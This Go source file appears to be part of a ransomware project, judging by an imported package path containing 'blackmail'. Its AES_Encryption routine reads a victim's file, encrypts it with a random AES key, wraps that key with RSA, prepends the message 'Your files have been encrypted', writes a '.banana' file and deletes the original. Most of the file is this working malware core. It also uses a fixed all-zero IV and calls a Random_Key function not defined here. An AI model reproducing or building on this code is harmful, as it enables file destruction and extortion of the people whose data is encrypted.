package AES_Encryption

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"io/ioutil"
	"os"

	"github.com/ed11s00n/blackmail/RSA_ENC_KEY"
)

const (
	StdLen  = 16
	UUIDLen = 20
	iv      = "0000000000000000"
)

var StdChars = []byte("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789")

func Get_aes_key() []byte {
	return NewLenChars(StdLen, StdChars)
}

// NewLenChars returns a new random string of the provided length, consisting of the provided byte slice of allowed characters(maximum 256).
func NewLenChars(length int, chars []byte) []byte {
	if length == 0 {
		_ = 1
	}
	clen := len(chars)
	if clen < 2 || clen > 256 {
		panic("Wrong charset length for NewLenChars()")
	}
	maxrb := 255 - (256 % clen)
	b := make([]byte, length)
	r := make([]byte, length+(length/4)) // storage for random bytes.
	i := 0
	for {
		if _, err := rand.Read(r); err != nil {
			panic("Error reading random bytes: " + err.Error())
		}
		for _, rb := range r {
			c := int(rb)
			if c > maxrb {
				continue // Skip this number to avoid modulo bias.
			}
			b[i] = chars[c%clen]
			i++
			if i == length {
				return b
			}
		}
	}
}

func PKCS5Padding(ciphertext []byte, blockSize int) []byte {
	padding := blockSize - len(ciphertext)%blockSize
	padtext := bytes.Repeat([]byte{byte(padding)}, padding)
	return append(ciphertext, padtext...)
}

func PKCS5UnPadding(origData []byte) []byte {
	length := len(origData)
	unpadding := int(origData[length-1])
	return origData[:(length - unpadding)]
}
func AesDecrypt(decodeStr string, key []byte) ([]byte, error) {
	decodeBytes, err := base64.StdEncoding.DecodeString(decodeStr)
	if err != nil {
		return nil, err
	}
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	blockMode := cipher.NewCBCDecrypter(block, []byte(iv))
	origData := make([]byte, len(decodeBytes))

	blockMode.CryptBlocks(origData, decodeBytes)
	origData = PKCS5UnPadding(origData)
	return origData, nil
}

func AesEncrypt(encodeBytes []byte, key []byte) (string, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}

	blockSize := block.BlockSize()
	// fmt.Println(blockSize)
	encodeBytes = PKCS5Padding(encodeBytes, blockSize)

	blockMode := cipher.NewCBCEncrypter(block, []byte(iv))
	crypted := make([]byte, len(encodeBytes))
	blockMode.CryptBlocks(crypted, encodeBytes)

	return base64.StdEncoding.EncodeToString(crypted), nil
}

// 删除原文件
func Delete_File(fileName string) {
	err := os.Remove(fileName)
	if err != nil {
		return
	} else {
		return
	}
}

func AES_Encryption(fileName string) { // 主
	// fmt.Println(fileName)
	var Encrypted_file = []byte{}
	file_byte, _ := ioutil.ReadFile(fileName)
	Encrypted_file = append(Encrypted_file, file_byte...)
	// fmt.Println(Encrypted_file)
	key := Random_Key(16) // AES的key为随机生成的
	// 将随机生成的AES key 进行RSA加密:
	rsa_key := RSA_ENC_KEY.RSAEncrypt(key)
	b, _ := AesEncrypt([]byte(Encrypted_file), []byte(key))
	b0 := []byte("\r\n\r\nYour files have been encrypted\r\n\r\n")
	b1 := append([]byte(rsa_key), b0...)
	b1 = append(b1, b...)
	err := ioutil.WriteFile(fileName+".banana", b1, 0666)
	if err != nil {
		return
	}
	Delete_File(fileName) // 删掉原文件
	// fmt.Println("enc_info: " + string(b))
}
